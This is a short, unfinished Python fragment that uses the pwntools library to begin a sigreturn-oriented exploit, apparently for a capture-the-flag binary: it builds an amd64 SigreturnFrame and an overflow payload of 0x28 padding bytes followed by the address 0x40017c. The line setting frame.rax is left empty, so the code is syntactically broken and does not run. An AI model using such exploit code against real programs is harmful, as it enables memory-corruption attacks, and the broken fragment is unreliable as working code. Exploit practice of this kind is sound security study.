from pwn import *

frame = SigreturnFrame(kernel='amd64')

frame.rax = 

payload = 'A'*0x28+p64(0x40017c)
